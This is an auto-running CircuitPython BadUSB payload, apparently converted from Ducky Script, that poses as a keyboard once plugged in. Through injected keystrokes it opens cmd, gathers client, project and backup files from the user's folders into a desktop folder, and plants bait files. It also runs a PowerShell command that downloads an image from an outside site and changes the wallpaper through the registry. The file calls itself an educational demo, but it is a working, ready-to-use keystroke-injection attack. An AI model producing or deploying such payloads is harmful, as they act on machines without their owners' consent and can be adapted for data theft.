"""
Happy Frog - Production CircuitPython Code
Generated from Happy Frog Script

This code will execute automatically when the device is plugged in.
Educational comments show what each command does.
"""

import time
import board
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

# Initialize HID devices
kbd = Keyboard(usb_hid.devices)
keyboard_layout = KeyboardLayoutUS(kbd)
# Production code - executes immediately on device boot/plug-in
# ATTACKMODE HID STORAGE detected - running payload automatically

# Wait for system to recognize the device
time.sleep(2)

#  Happy Frog Script - Converted from Ducky Script

#  Original source: payloads/ducky.txt

#  Educational conversion - review all commands before execution

#  BadUSB Demo: Open Terminal, Notepad, and type a message

    # ATTACKMODE: Configured for HID emulation (HID STORAGE)
    # Note: This device is configured as a HID keyboard/mouse
    # Configuration: HID STORAGE

time.sleep(2.0)  # Delay 2000ms

#  Open File Explorer

kbd.press(Keycode.GUI)  # Press MOD
kbd.press(Keycode.E)  # Press e
kbd.release(Keycode.E)  # Release e
kbd.release(Keycode.GUI)  # Release MOD

time.sleep(1.0)  # Delay 1000ms

#  Open Command Prompt

kbd.press(Keycode.GUI)  # Press MOD
kbd.press(Keycode.R)  # Press r
kbd.release(Keycode.R)  # Release r
kbd.release(Keycode.GUI)  # Release MOD

time.sleep(0.5)  # Delay 500ms

keyboard_layout.write("cmd")  # Type text

kbd.press(Keycode.ENTER)  # Press ENTER
kbd.release(Keycode.ENTER)  # Release ENTER

time.sleep(1.0)  # Delay 1000ms

#  Search and copy files named client*, project*, or backup* from Documents, Desktop, and Downloads to Desktop\Do Not Delete

keyboard_layout.write("mkdir \"%USERPROFILE%\\Desktop\\Do Not Delete\" & for %i in (client* project* backup*) do (for /r \"%USERPROFILE%\\Documents\" %f in (%i.*) do copy \"%f\" \"%USERPROFILE%\\Desktop\\Do Not Delete\" & for /r \"%USERPROFILE%\\Desktop\" %f in (%i.*) do copy \"%f\" \"%USERPROFILE%\\Desktop\\Do Not Delete\" & for /r \"%USERPROFILE%\\Downloads\" %f in (%i.*) do copy \"%f\" \"%USERPROFILE%\\Desktop\\Do Not Delete\")")  # Type text

kbd.press(Keycode.ENTER)  # Press ENTER
kbd.release(Keycode.ENTER)  # Release ENTER

time.sleep(0.5)  # Delay 500ms

keyboard_layout.write("for %i in (client* project* backup*) do (for /r \"%USERPROFILE%\\Documents\" %f in (%i.*) do copy \"%f\" \"%USERPROFILE%\\Desktop\\Do Not Delete\" & for /r \"%USERPROFILE%\\Desktop\" %f in (%i.*) do copy \"%f\" \"%USERPROFILE%\\Desktop\\Do Not Delete\" & for /r \"%USERPROFILE%\\Downloads\" %f in (%i.*) do copy \"%f\" \"%USERPROFILE%\\Desktop\\Do Not Delete\")")  # Type text

kbd.press(Keycode.ENTER)  # Press ENTER
kbd.release(Keycode.ENTER)  # Release ENTER

time.sleep(1.0)  # Delay 1000ms

#  Add sample files

keyboard_layout.write("echo ExamplePassword123! > \"%USERPROFILE%\\Desktop\\Do Not Delete\\passwords.txt\"")  # Type text

kbd.press(Keycode.ENTER)  # Press ENTER
kbd.release(Keycode.ENTER)  # Release ENTER

time.sleep(0.5)  # Delay 500ms

keyboard_layout.write("echo If you are reading this, you fell for the bait! > \"%USERPROFILE%\\Desktop\\Do Not Delete\\README.txt\"")  # Type text

kbd.press(Keycode.ENTER)  # Press ENTER
kbd.release(Keycode.ENTER)  # Release ENTER

time.sleep(0.5)  # Delay 500ms

#  Change wallpaper to hacker skull

keyboard_layout.write("powershell -command \"Invoke-WebRequest -Uri 'https://wallpapers.com/images/hd/black-skull-hacker-3i5cydng2l8h144o.jpg' -OutFile $env:USERPROFILE\\Desktop\\DoNotDeleteWallpaper.jpg; reg add 'HKCU\\Control Panel\\Desktop' /v Wallpaper /t REG_SZ /d $env:USERPROFILE\\Desktop\\DoNotDeleteWallpaper.jpg /f; RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters\"")  # Type text

kbd.press(Keycode.ENTER)  # Press ENTER
kbd.release(Keycode.ENTER)  # Release ENTER

time.sleep(3.0)  # Delay 3000ms

#  Open Notepad

kbd.press(Keycode.GUI)  # Press MOD
kbd.press(Keycode.R)  # Press r
kbd.release(Keycode.R)  # Release r
kbd.release(Keycode.GUI)  # Release MOD

time.sleep(0.5)  # Delay 500ms

keyboard_layout.write("notepad")  # Type text

kbd.press(Keycode.ENTER)  # Press ENTER
kbd.release(Keycode.ENTER)  # Release ENTER

time.sleep(1.5)  # Delay 1500ms

#  Type ASCII "Zero" in Notepad

keyboard_layout.write("______   ______   _____    ______")  # Type text

kbd.press(Keycode.ENTER)  # Press ENTER
kbd.release(Keycode.ENTER)  # Release ENTER

keyboard_layout.write("|___  /  |  ____| |  __ \\  |  __  |")  # Type text

kbd.press(Keycode.ENTER)  # Press ENTER
kbd.release(Keycode.ENTER)  # Release ENTER

keyboard_layout.write("/ /   | |__    | |__) | | |  | |")  # Type text

kbd.press(Keycode.ENTER)  # Press ENTER
kbd.release(Keycode.ENTER)  # Release ENTER

keyboard_layout.write("/ /    |  __|   |  _  /  | |  | |")  # Type text

kbd.press(Keycode.ENTER)  # Press ENTER
kbd.release(Keycode.ENTER)  # Release ENTER

keyboard_layout.write("/ /__   | |____  | | \\ \\  | |__| |")  # Type text

kbd.press(Keycode.ENTER)  # Press ENTER
kbd.release(Keycode.ENTER)  # Release ENTER

keyboard_layout.write("/_____|  |______| |_|  \\_\\ |______|")  # Type text

kbd.press(Keycode.ENTER)  # Press ENTER
kbd.release(Keycode.ENTER)  # Release ENTER

time.sleep(0.5)  # Delay 500ms

keyboard_layout.write("never trust an open machine")  # Type text

kbd.press(Keycode.ENTER)  # Press ENTER
kbd.release(Keycode.ENTER)  # Release ENTER

time.sleep(0.5)  # Delay 500ms

keyboard_layout.write("*** DEMO: Your files have been copied. This is a security demonstration. ***")  # Type text

kbd.press(Keycode.ENTER)  # Press ENTER
kbd.release(Keycode.ENTER)  # Release ENTER

keyboard_layout.write("To protect your data, always lock your machine and use strong passwords.")  # Type text

kbd.press(Keycode.ENTER)  # Press ENTER
kbd.release(Keycode.ENTER)  # Release ENTER

keyboard_layout.write("This was a demo. Next time, don't plug in random USB drives or borrow chargers!")  # Type text

kbd.press(Keycode.ENTER)  # Press ENTER
kbd.release(Keycode.ENTER)  # Release ENTER

#  Conversion completed by Happy Frog

#  Remember: Use only for educational purposes and authorized testing!


"""
End of Happy Frog Generated Code
"""